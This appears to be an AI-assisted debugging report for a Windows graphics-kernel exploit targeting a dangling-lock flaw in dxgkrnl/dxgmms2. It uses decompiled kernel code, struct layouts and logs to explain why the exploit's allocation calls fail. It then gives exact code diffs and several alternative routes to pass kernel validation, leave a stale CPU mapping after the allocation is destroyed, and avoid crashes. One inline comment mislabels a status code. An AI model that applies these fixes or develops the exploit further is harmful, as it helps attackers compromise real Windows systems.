# DXGKRNL Dangling Lock Exploit: Allocation Failure Analysis

## Executive Summary

Both allocation creation paths in the exploit fail due to **parameter validation errors**, not struct layout bugs. The struct definitions are all correct (verified against IDA types). The root causes are:

1. **D3D11 path**: `D3D11_RESOURCE_MISC_SHARED_NTHANDLE` (0x800) is set without `D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX` (0x100). The D3D11 runtime requires these flags to be combined. **Fix: Set `MiscFlags = 0x900` (NTHANDLE | KEYEDMUTEX)**.

2. **D3DKMT path**: `Flags.Value = 0x20` (ExistingSysMem only) is rejected by `DxgkCreateAllocationInternal` because the kernel requires `StandardAllocation` (0x10000) to also be set when `ExistingSysMem` is set for non-DxgProcess callers. **Fix: Set `Flags.Value = 0x10020`, provide a valid `pStandardAllocation` struct**.

---

## Task A: D3D11 CreateTexture2D Failure Analysis

### Symptom

```
[01:50:20.560] [+] D3D11 device created, feature level=0xB000
[01:50:20.560] [+] D3D11 adapter LUID=106110-0, VRAM=128 MB
[01:50:20.562] [+] Matched D3D11 adapter to D3DKMT adapter 0 (handle=0x40000000)
[01:50:20.566]   D3DKMTCreateDevice: NTSTATUS=0x00000000, hDevice=0x400007C0
[01:50:20.566]   [0] CreateTexture2D failed (hr=0x80070057)
```

`E_INVALIDARG` (0x80070057) from `ID3D11Device::CreateTexture2D`.

### Current Code (line 1071-1082 of exploit)

```cpp
texDesc.Format = DXGI_FORMAT_R8_UNORM;
texDesc.BindFlags = D3D11_BIND_SHADER_RESOURCE;
texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_NTHANDLE;  // 0x800 only
```

### Root Cause: Missing KEYEDMUTEX Flag

From MSDN (https://learn.microsoft.com/en-us/windows/win32/api/d3d11/ne-d3d11-d3d11_resource_misc_flag):

> `D3D11_RESOURCE_MISC_SHARED_NTHANDLE` (0x800L): Set this flag to enable the use of NT HANDLE values when you create a shared resource.
>
> `D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX` (0x100L): ... Starting with Windows 8, we recommend that you enable resource data sharing between two or more Direct3D devices by using a combination of the D3D11_RESOURCE_MISC_SHARED_NTHANDLE and D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX flags instead.
>
> `D3D11_RESOURCE_MISC_SHARED` and `D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX` are mutually exclusive.

The D3D11 runtime (d3d11.dll) enforces that `D3D11_RESOURCE_MISC_SHARED_NTHANDLE` must be combined with `D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX`. Without KEYEDMUTEX, CreateTexture2D returns `E_INVALIDARG` immediately — this is a **user-mode runtime validation** that never reaches the kernel driver.

Python-verified flag values:
```
D3D11_RESOURCE_MISC_SHARED            = 0x002
D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX = 0x100
D3D11_RESOURCE_MISC_SHARED_NTHANDLE   = 0x800

Exploit sets: 0x800 (NTHANDLE only)           -> E_INVALIDARG
Correct:      0x900 (NTHANDLE | KEYEDMUTEX)   -> should work
```

### Secondary Issue: Format Compatibility

`DXGI_FORMAT_R8_UNORM` may not support shared resource creation on all GPU drivers. When `D3D11_RESOURCE_MISC_SHARED_NTHANDLE` is set, the D3D11 runtime "must confirm that the shared resource works on all hardware at the specified feature level" (MSDN). The Intel UHD driver (27.20.100.8935, Ice Lake) may reject R8_UNORM for shared textures.

**Safer formats for shared textures:**
- `DXGI_FORMAT_B8G8R8A8_UNORM` (most universally supported, used by DWM)
- `DXGI_FORMAT_R8G8B8A8_UNORM` (widely supported)

### Adapter Selection

The D3D11 device is created on adapter 0 (Intel UHD, LUID=106110-0, VRAM=128MB). This is the default adapter selected by `D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, ...)`.

The LUID matching logic (lines 1031-1040) correctly matches the D3D11 adapter to D3DKMT adapter 0. The adapter selection is not the problem — the flag combination is.

If the Intel UHD driver rejects the texture even after fixing the flags, try the NVIDIA adapter (adapter 1, LUID=109429-0) by explicitly passing the NVIDIA `IDXGIAdapter` to `D3D11CreateDevice`.

### Proposed Fix for D3D11 Path

```cpp
texDesc.Format = DXGI_FORMAT_B8G8R8A8_UNORM;  // safer than R8_UNORM
texDesc.BindFlags = D3D11_BIND_SHADER_RESOURCE;
texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_NTHANDLE
                  | D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX;  // 0x900
```

When opening the shared resource via `D3DKMTOpenResourceFromNtHandle`, the `hKeyedMutex` field in `D3DKMT_OPENRESOURCEFROMNTHANDLE` may be populated. The exploit should check for this and handle the keyed mutex if present.

---

## Task B: D3DKMT CreateAllocation Failure Analysis

### Symptom

ALL 256+ attempts fail with `STATUS_INVALID_PARAMETER` (0xC000000D):
```
[01:50:20.580]   [0] EXISTING_SYSMEM: pSystemMem=000001AB3CE00000, Flags=0x20
[01:50:20.580]   [0] ExistingSysMem CreateAllocation FAILED: 0xC000000D (STATUS_INVALID_PARAMETER)
```

### Current Code (lines 825-838 of exploit)

```cpp
createAlloc->hDevice = m_hDevice;
createAlloc->NumAllocations = 1;
createAlloc->pAllocationInfo = allocInfo;
createAlloc->PrivateDriverDataSize = 0;
createAlloc->Flags.Value = 0x20;  // ExistingSysMem only

allocInfo->hAllocation = 0;
allocInfo->pSystemMem = sysMem;  // VirtualAlloc'd 0x1000 page
allocInfo->pPrivateDriverData = nullptr;
allocInfo->PrivateDriverDataSize = 0;
allocInfo->VidPnSourceId = 0;
allocInfo->Flags.Value = 0;
```

### IDA Decompilation Evidence

#### Function: `DxgkCreateAllocationInternal` (dxgkrnl.sys @ 0x1C00FAFE0)

The critical validation is at the beginning of the function, after the `D3DKMT_CREATEALLOCATION` struct is copied from user space into local variable `v79`:

```c
// Read Flags from the local copy
Flags = (unsigned int)v79.Flags;

// ... WSL feature check, NumAllocations > 0x682AA check ...

// CRITICAL CHECK: v9[347] & 0x20 = isDxgProcess flag
v26 = v9[347];
LOBYTE(v26) = v26 & 0x20;

if ( !(_BYTE)v26 && ((Flags & 8) != 0 || (Flags & 0x100) != 0 || (Flags & 0x1000) != 0 || (Flags & 0x200) != 0)
  || (Flags & 0x20) != 0 && (Flags & 0x10000) == 0 && !(_BYTE)v26 )
{
LABEL_33:
    // Log warning and return STATUS_INVALID_PARAMETER
    v27 = WdLogNewEntry5_WdWarning(v26);
    *(_QWORD *)(v27 + 24) = v18;        // device
    *(_QWORD *)(v27 + 32) = -1073741811; // 0xC0000023 logged, but returns 0xC000000D
    WdLogEvent5_WdWarning(v27);
    goto LABEL_102;  // -> return 3221225485 = 0xC000000D
}
```

Decoded in Python (verified via IDA py_eval):
```python
exploit_flags = 0x20  # ExistingSysMem only
isDxgProcess = False   # Normal user-mode process

check1 = (exploit_flags & 0x20) != 0       # True  - ExistingSysMem is set
check2 = (exploit_flags & 0x10000) == 0    # True  - StandardAllocation is NOT set
check3 = not isDxgProcess                   # True  - Not a DxgProcess

# All three True -> || chain is True -> STATUS_INVALID_PARAMETER
kernel_rejects = check1 and check2 and check3  # True
```

The kernel logic is:

**If `ExistingSysMem` (0x20) is set AND `StandardAllocation` (0x10000) is NOT set AND the caller is NOT a DxgProcess → STATUS_INVALID_PARAMETER**

A normal user-mode process is never a DxgProcess (that flag at process+347 bit 0x20 is only set for DXG-aware processes, which are kernel/dxgkernel internal). So the exploit MUST set `StandardAllocation` (0x10000) alongside `ExistingSysMem` (0x20).

#### Function: `ValidateStandardAllocationParams` (dxgkrnl.sys @ 0x1C022A804)

When `StandardAllocation` (0x10000) IS set, the kernel calls `ValidateStandardAllocationParams`:

```c
__int64 __fastcall ValidateStandardAllocationParams(
    struct _D3DKMT_CREATEALLOCATION *a1,
    struct _D3DKMT_CREATESTANDARDALLOCATION *a2,
    char a3)  // a3 = PreviousMode (1 = UserMode)
{
    // Check 1: Exactly one of ExistingSysMem(0x20) or ExistingSection(0x20000) must be set
    if ( (*(_DWORD *)&a1->Flags & 0x20020) == 0          // Neither set
      || (*(_DWORD *)&a1->Flags & 0x20020) == 0x20020     // Both set
      || a1->PrivateDriverDataSize                         // Must be 0
      || a1->NumAllocations != 1 )                         // Must be exactly 1
    {
        goto LABEL_2;  // STATUS_INVALID_PARAMETER
    }

    // Check 2: Copy pStandardAllocation from user space (probed)
    if ( a3 )  // UserMode
    {
        pStandardAllocation = (ULONG64)a1->pStandardAllocation;
        if ( pStandardAllocation >= MmUserProbeAddress )
            pStandardAllocation = MmUserProbeAddress;
        // Read 24 bytes (sizeof D3DKMT_CREATESTANDARDALLOCATION)
        *(_OWORD *)&a2->Type = *(_OWORD *)pStandardAllocation;        // 16 bytes
        *(_QWORD *)&a2->Flags.0 = *(_QWORD *)(pStandardAllocation + 16); // 8 bytes
    }

    // Check 3: Type must be EXISTINGHEAP (1), Flags must be 0
    if ( a2->Type != D3DKMT_STANDARDALLOCATIONTYPE_EXISTINGHEAP || a2->Flags.Value )
        goto LABEL_2;  // STATUS_INVALID_PARAMETER

    // Check 4: ExistingHeapData.Size must be > 0 and <= 0xFFFFFFFE
    if ( a2->ExistingHeapData.Size - 1 <= 0xFFFFFFFE )
        return 0;  // SUCCESS
    else
        goto LABEL_2;  // STATUS_INVALID_PARAMETER (Size is 0 or > 0xFFFFFFFE)
}
```

**Requirements for ValidateStandardAllocationParams to succeed:**
1. Flags must have exactly one of `ExistingSysMem` (0x20) or `ExistingSection` (0x20000), not both
2. `PrivateDriverDataSize` in CREATEALLOCATION must be 0
3. `NumAllocations` must be 1
4. `pStandardAllocation` must point to a valid 24-byte `_D3DKMT_CREATESTANDARDALLOCATION` struct
5. `StandardAllocation.Type` must be `D3DKMT_STANDARDALLOCATIONTYPE_EXISTINGHEAP` (1)
6. `StandardAllocation.Flags.Value` must be 0
7. `StandardAllocation.ExistingHeapData.Size` must be > 0 and <= 0xFFFFFFFE

#### After Validation: GetStandardAllocationDriverData

In `DxgkCreateAllocationInternal`, after `ValidateStandardAllocationParams` succeeds:

```c
if ( (*(_DWORD *)&v79.Flags & 0x10000) != 0 )  // StandardAllocation is set
{
    v60 = *(_QWORD *)(*((_QWORD *)v18 + 2) + 16LL);  // Get DXGADAPTER
    if ( *(int *)(v60 + 2596) < 2000 )  // Adapter version check
    {
        // Error: STATUS_INVALID_PARAMETER
        goto LABEL_102;
    }
    // Get standard allocation driver data
    v92 = 0;
    Size = v93.ExistingHeapData.Size;  // From the validated struct
    v90 = 1;
    v91 = 7;
    StandardAllocationDriverData = DXGDEVICE::GetStandardAllocationDriverData(v52, v58, &Size, &v77, &v80);
    if ( StandardAllocationDriverData < 0 )
    {
        // Error from GetStandardAllocationDriverData
        goto LABEL_109;
    }
    v59 = v77;
}
// Then call DXGDEVICE::CreateAllocation with all the data
v64 = DXGDEVICE::CreateAllocation(v52, &v79, v71, 0, nullptr, nullptr,
    (struct COREDEVICEACCESS *)v94, 0, nullptr, nullptr, nullptr,
    (unsigned __int8 *)v78, &v93, v80, v59);
```

This shows the kernel generates the private driver data internally via `GetStandardAllocationDriverData`, so the user does NOT need to provide `pPrivateDriverData`.

### Previous BSOD Explanation

The exploit comments say:
```
FIXED: Removed Flags=0x30000 (StandardAllocation|ExistingSection) path
       that caused BSOD 0x3B in CreateVidMmAllocations+0x2CE (NULL deref)
```

The BSOD was with `Flags = 0x30000` (StandardAllocation=0x10000 | ExistingSection=0x20000). This is a **different path** from the proposed fix of `Flags = 0x10020` (StandardAllocation=0x10000 | ExistingSysMem=0x20).

The `ExistingSection` (0x20000) path uses memory-mapped sections (`hSection` in ALLOCATIONINFO2) instead of `pSystemMem` in ALLOCATIONINFO. The NULL dereference in `CreateVidMmAllocations+0x2CE` was likely because the section-related fields were not properly initialized for the ExistingSection path.

The `ExistingSysMem` (0x20) path uses `pSystemMem` (a VirtualAlloc'd pointer), which is the path the exploit already attempts to use. Adding `StandardAllocation` (0x10000) to the flags should NOT trigger the same BSOD because:
1. The ExistingSysMem code path in CreateVidMmAllocations handles `pSystemMem` pointers
2. The `GetStandardAllocationDriverData` function generates the driver data internally, avoiding the NULL dereference that occurred when user-provided driver data was expected

### Proposed Fix for D3DKMT Path

```cpp
// Create a valid D3DKMT_CREATESTANDARDALLOCATION struct
D3DKMT_CREATESTANDARDALLOCATION standardAlloc = {};
standardAlloc.Type = D3DKMT_STANDARDALLOCATIONTYPE_EXISTINGHEAP;  // = 1
standardAlloc.Flags = 0;  // must be 0
standardAlloc.ExistingHeapData.Size = 0x1000;  // size of the VirtualAlloc'd page

// Set the flags
createAlloc->hDevice = m_hDevice;
createAlloc->NumAllocations = 1;
createAlloc->pAllocationInfo = allocInfo;
createAlloc->PrivateDriverDataSize = 0;  // MUST be 0 for StandardAllocation
createAlloc->Flags.Value = 0x10020;      // ExistingSysMem | StandardAllocation
createAlloc->pStandardAllocation = &standardAlloc;  // MUST be valid pointer

allocInfo->hAllocation = 0;
allocInfo->pSystemMem = sysMem;  // VirtualAlloc'd 0x1000 page
allocInfo->pPrivateDriverData = nullptr;
allocInfo->PrivateDriverDataSize = 0;
allocInfo->VidPnSourceId = 0;
allocInfo->Flags.Value = 0;
```

---

## Task C: Alternative Approaches

### Option 1: Fix D3D11 Path (Recommended — Lowest BSOD Risk)

Change `MiscFlags` to include `KEYEDMUTEX` and use a safer format:
```cpp
texDesc.Format = DXGI_FORMAT_B8G8R8A8_UNORM;
texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_NTHANDLE | D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX;
```

The D3D11 path is preferred because:
- D3D11 handles all private driver data marshaling internally
- GPU-managed allocations are less likely to cause BSOD
- The shared NT handle allows `D3DKMTOpenResourceFromNtHandle` to open the allocation for D3DKMTLock

### Option 2: Fix D3DKMT Path with StandardAllocation

Set `Flags.Value = 0x10020` and provide a valid `pStandardAllocation`:
```cpp
D3DKMT_CREATESTANDARDALLOCATION standardAlloc = {};
standardAlloc.Type = D3DKMT_STANDARDALLOCATIONTYPE_EXISTINGHEAP;
standardAlloc.ExistingHeapData.Size = 0x1000;
createAlloc->Flags.Value = 0x10020;
createAlloc->pStandardAllocation = &standardAlloc;
```

Risk: This path was never tested with 0x10020 (only 0x30000 was tested and BSOD'd). The ExistingSysMem variant should use a different code path than ExistingSection, but verify on a test machine first.

### Option 3: Use D3DKMTCreateAllocation2

The exploit already resolves `CreateAllocation2` from gdi32.dll but never uses it. `D3DKMTCreateAllocation2` uses `D3DDDI_ALLOCATIONINFO2` (96 bytes) instead of `D3DDDI_ALLOCATIONINFO` (40 bytes). The kernel function `DxgkCreateAllocationInternal` handles both via the union at offset +0x30:

```c
union {  // +0x30 in _D3DKMT_CREATEALLOCATION
    const D3DDDI_ALLOCATIONINFO *pAllocationInfo;
    const D3DDDI_ALLOCATIONINFO2 *pAllocationInfo2;
};
```

The same kernel validation applies — `ExistingSysMem` still requires `StandardAllocation` regardless of which API is used. But `D3DKMTCreateAllocation2` might handle the struct layout differently in user-mode (gdi32.dll) before reaching the kernel.

### Option 4: Use D3D11_RESOURCE_MISC_SHARED (without NTHANDLE)

```cpp
texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED;  // 0x2
```

This creates a shared resource with a global share handle (not NT handle). Then use `IDXGIResource::GetSharedHandle()` to get the handle, and `D3DKMTOpenResourceFromNtHandle` is NOT needed — use `D3DKMTOpenResource` instead.

However, the exploit specifically needs `D3DKMTOpenResourceFromNtHandle` to get a D3DKMT allocation handle for `D3DKMTLock`. With `D3D11_RESOURCE_MISC_SHARED`, the shared handle is a `HANDLE` (not NT handle), and `D3DKMTOpenResourceFromNtHandle` requires an NT handle.

To use `D3D11_RESOURCE_MISC_SHARED`:
- Use `IDXGIResource::GetSharedHandle()` to get the global share handle
- Use `D3DKMTOpenResource` (not `OpenResourceFromNtHandle`) to open it
- This requires resolving `D3DKMTOpenResource` from gdi32.dll

### Option 5: Try NVIDIA Adapter

If the Intel UHD driver (27.20.100.8935) rejects shared textures even with correct flags, try creating the D3D11 device on the NVIDIA MX130 adapter:

```cpp
// Enumerate DXGI adapters and find NVIDIA
IDXGIFactory1 *factory;
CreateDXGIFactory1(__uuidof(IDXGIFactory1), (void**)&factory);
IDXGIAdapter *nvidiaAdapter = nullptr;
for (UINT i = 0; factory->EnumAdapters(i, &nvidiaAdapter) != DXGI_ERROR_NOT_FOUND; i++) {
    DXGI_ADAPTER_DESC desc;
    nvidiaAdapter->GetDesc(&desc);
    if (desc.VendorId == 0x10DE) {  // NVIDIA
        break;
    }
    nvidiaAdapter->Release();
}

// Create D3D11 device on NVIDIA adapter
pfnCreateDevice(nvidiaAdapter, D3D_DRIVER_TYPE_HARDWARE, nullptr,
    D3D11_CREATE_DEVICE_BGRA_SUPPORT, nullptr, 0, D3D11_SDK_VERSION,
    &d3dDevice, &featureLevel, &d3dContext);
```

Then match the NVIDIA LUID to the D3DKMT adapter (adapter 1, LUID=109429-0).

---

## Task D: Struct Layout Verification (IDA-Confirmed)

### _D3DKMT_CREATEALLOCATION (IDA: size=0x48=72 bytes)

| Offset | Size | Field | Type |
|--------|------|-------|------|
| +0x00 | 4 | hDevice | D3DKMT_HANDLE |
| +0x04 | 4 | hResource | D3DKMT_HANDLE |
| +0x08 | 4 | hGlobalShare | D3DKMT_HANDLE |
| +0x0C | 4 | [padding] | — |
| +0x10 | 8 | pPrivateRuntimeData | const void * |
| +0x18 | 4 | PrivateRuntimeDataSize | UINT |
| +0x1C | 4 | [padding] | — |
| +0x20 | 8 | pStandardAllocation / pPrivateDriverData | union (void *) |
| +0x28 | 4 | PrivateDriverDataSize | UINT |
| +0x2C | 4 | NumAllocations | UINT |
| +0x30 | 8 | pAllocationInfo / pAllocationInfo2 | union (void *) |
| +0x38 | 4 | Flags | D3DKMT_CREATEALLOCATIONFLAGS |
| +0x3C | 4 | [padding] | — |
| +0x40 | 8 | hPrivateRuntimeResourceHandle | HANDLE |

**Exploit match: CORRECT** (lines 244-262)

### _D3DDDI_ALLOCATIONINFO (IDA: size=0x28=40 bytes)

| Offset | Size | Field | Type |
|--------|------|-------|------|
| +0x00 | 4 | hAllocation | D3DKMT_HANDLE |
| +0x04 | 4 | [padding] | — |
| +0x08 | 8 | pSystemMem | const void * |
| +0x10 | 8 | pPrivateDriverData | void * |
| +0x18 | 4 | PrivateDriverDataSize | UINT |
| +0x1C | 4 | VidPnSourceId | D3DDDI_VIDEO_PRESENT_SOURCE_ID |
| +0x20 | 4 | Flags | union (bitfield) |
| +0x24 | 4 | [padding] | — |

**Exploit match: CORRECT** (lines 190-197). Note the 4-byte padding between `hAllocation` and `pSystemMem` due to 8-byte alignment.

### _D3DDDI_ALLOCATIONINFO2 (IDA: size=0x60=96 bytes)

| Offset | Size | Field | Type |
|--------|------|-------|------|
| +0x00 | 4 | hAllocation | D3DKMT_HANDLE |
| +0x04 | 4 | [padding] | — |
| +0x08 | 8 | pSystemMem / hSection | union (void *) |
| +0x10 | 8 | pPrivateDriverData | void * |
| +0x18 | 4 | PrivateDriverDataSize | UINT |
| +0x1C | 4 | VidPnSourceId | D3DDDI_VIDEO_PRESENT_SOURCE_ID |
| +0x20 | 4 | Flags | union (bitfield) |
| +0x24 | 4 | [padding] | — |
| +0x28 | 8 | GpuVirtualAddress | D3DGPU_VIRTUAL_ADDRESS |
| +0x30 | 8 | Priority / Unused | union |
| +0x38 | 40 | Reserved[5] | ULONG_PTR[5] |

**Exploit match: CORRECT** (lines 226-242)

### _D3DKMT_CREATEALLOCATIONFLAGS (IDA: size=4 bytes, bitfield)

| Bit | Mask | Field |
|-----|------|-------|
| 0 | 0x1 | CreateResource |
| 1 | 0x2 | CreateShared |
| 2 | 0x4 | Nonsecure |
| 3 | 0x8 | CreateProtected |
| 4 | 0x10 | RestrictSharedAccess |
| 5 | 0x20 | ExistingSysMem |
| 6 | 0x40 | NtSecuritySharing |
| 7 | 0x80 | ReadOnly |
| 8 | 0x100 | CreateWriteCombined |
| 9 | 0x200 | CreateCached |
| 10 | 0x400 | SwapChainBackBuffer |
| 11 | 0x800 | CrossAdapter |
| 12 | 0x1000 | OpenCrossAdapter |
| 13 | 0x2000 | PartialSharedCreation |
| 14 | 0x4000 | Zeroed |
| 15 | 0x8000 | WriteWatch |
| 16 | 0x10000 | StandardAllocation |
| 17 | 0x20000 | ExistingSection |
| 18-31 | — | Reserved (14 bits) |

**Exploit match: CORRECT** (lines 199-224)

### _D3DKMT_CREATESTANDARDALLOCATION (IDA: size=0x18=24 bytes)

| Offset | Size | Field | Type |
|--------|------|-------|------|
| +0x00 | 4 | Type | D3DKMT_STANDARDALLOCATIONTYPE (enum) |
| +0x04 | 4 | [padding] | — |
| +0x08 | 8 | ExistingHeapData.Size | SIZE_T (8 bytes on x64) |
| +0x10 | 4 | Flags | D3DKMT_CREATESTANDARDALLOCATIONFLAGS |
| +0x14 | 4 | [padding] | — |

**IDA type detail:** `D3DKMT_STANDARDALLOCATION_EXISTINGHEAP` has `Size` as `SIZE_T` (8 bytes on x64), NOT `ULONG` (4 bytes). The exploit defines it as `ULONG Size + ULONG Padding` which is equivalent on little-endian x64 as long as Padding is zeroed.

**Exploit match: CORRECT** (lines 368-376), but note the `ExistingHeapData.Size` is actually a 64-bit `SIZE_T`, not two 32-bit fields.

### _D3DKMT_CREATEDEVICE (IDA: size=0x40=64 bytes)

| Offset | Size | Field | Type |
|--------|------|-------|------|
| +0x00 | 8 | hAdapter / AdapterLuid | union (D3DKMT_HANDLE + padding / LUID) |
| +0x08 | 4 | Flags | D3DKMT_CREATEDEVICEFLAGS |
| +0x0C | 4 | hDevice | D3DKMT_HANDLE (OUT) |
| +0x10 | 48 | [reserved/padding] | — |

**Exploit match: CORRECT** (lines 156-163)

---

## Vulnerability Verification: CloseOneAllocation (dxgmms2.sys @ 0x1C006A8D0)

Decompiled `VIDMM_GLOBAL::CloseOneAllocation` confirms the dangling lock vulnerability:

```c
// Check VIDMM_ALLOC+0x90 (a2[6].Header.Lock in decompiler notation)
// a2 is VIDMM_ALLOC*, sizeof(KEVENT)=0x18, so a2[6] = offset 6*0x18 = 0x90
if ( *(_QWORD *)&a2[6].Header.Lock )  // VIDMM_ALLOC+0x90 != 0?
{
    if ( (**(_DWORD **)(v12 + 496) & 0x10000008) != 0 )
        MmUnmapViewOfSection(**(_QWORD **)(*(_QWORD *)&a2->Header.Lock + 8LL));
    *(_QWORD *)&a2[6].Header.Lock = 0;  // Clear the mapping
}
```

- **VIDMM_ALLOC+0x90**: The CPU virtual address mapping for "CPU-visible" (type 1) locks. If NULL, the unmap is **skipped**.
- **multi_alloc+0x10 (VIDMM_LOCAL_ALLOC+0x10)**: Where `D3DKMTLock` stores the CPU VA for "non-CPU-visible" (type 5) locks. This is a **different field** from +0x90.
- **Result**: For type 5 locks, `VIDMM_ALLOC+0x90` is never set, so `CloseOneAllocation` skips the `MmUnmapViewOfSection` call. The mapping at `VIDMM_LOCAL_ALLOC+0x10` persists as a dangling PTE after `D3DKMTDestroyAllocation`.

Only `D3DKMTUnlock` unmaps `VIDMM_LOCAL_ALLOC+0x10`, and the exploit deliberately never calls it.

---

## Summary of Required Changes

### D3D11 Path Fix (Primary — line 1082)
```diff
- texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_NTHANDLE;
+ texDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_NTHANDLE | D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX;
```
Optionally also change format:
```diff
- texDesc.Format = DXGI_FORMAT_R8_UNORM;
+ texDesc.Format = DXGI_FORMAT_B8G8R8A8_UNORM;
```

### D3DKMT Path Fix (Fallback — lines 825-838)
```diff
+ D3DKMT_CREATESTANDARDALLOCATION standardAlloc = {};
+ standardAlloc.Type = D3DKMT_STANDARDALLOCATIONTYPE_EXISTINGHEAP;  // = 1
+ standardAlloc.ExistingHeapData.Size = 0x1000;
+
  createAlloc->hDevice = m_hDevice;
  createAlloc->NumAllocations = 1;
  createAlloc->pAllocationInfo = allocInfo;
  createAlloc->PrivateDriverDataSize = 0;
- createAlloc->Flags.Value = 0x20;
+ createAlloc->Flags.Value = 0x10020;  // ExistingSysMem | StandardAllocation
+ createAlloc->pStandardAllocation = &standardAlloc;
```

### Key Validation Rules (from IDA decompilation)

1. **ExistingSysMem (0x20) WITHOUT StandardAllocation (0x10000)**: Rejected for non-DxgProcess callers in `DxgkCreateAllocationInternal`
2. **StandardAllocation WITH pStandardAllocation = NULL**: Will BSOD (NULL deref in `ValidateStandardAllocationParams` when reading from address 0)
3. **StandardAllocation Type must be EXISTINGHEAP (1)** with `Flags.Value = 0`
4. **ExistingHeapData.Size must be > 0 and <= 0xFFFFFFFE**
5. **PrivateDriverDataSize in CREATEALLOCATION must be 0** when StandardAllocation is set
6. **NumAllocations must be 1** when StandardAllocation is set
7. **D3D11_RESOURCE_MISC_SHARED_NTHANDLE requires D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX** (runtime validation in d3d11.dll, returns E_INVALIDARG without reaching the kernel)
8. **D3D11_RESOURCE_MISC_SHARED and D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX are mutually exclusive** (per MSDN)

---

## IDA Instances Used

| Instance | Binary | PID | Port | Key Functions Analyzed |
|----------|--------|-----|------|----------------------|
| 3 | dxgkrnl.sys | 12320 | 13339 | `DxgkCreateAllocation`, `DxgkCreateAllocationInternal`, `ValidateStandardAllocationParams`, `DXGDEVICE::CreateAllocation`, type definitions |
| 2 | dxgmms2.sys | 13116 | 13338 | `VIDMM_GLOBAL::CloseOneAllocation` (vulnerability verification) |

## Context7 / Web References

- MSDN D3D11_RESOURCE_MISC_FLAG: https://learn.microsoft.com/en-us/windows/win32/api/d3d11/ne-d3d11-d3d11_resource_misc_flag
- SHARED_NTHANDLE (0x800) requires SHARED_KEYEDMUTEX (0x100) per D3D11 runtime validation
- SHARED (0x2) and SHARED_KEYEDMUTEX (0x100) are mutually exclusive
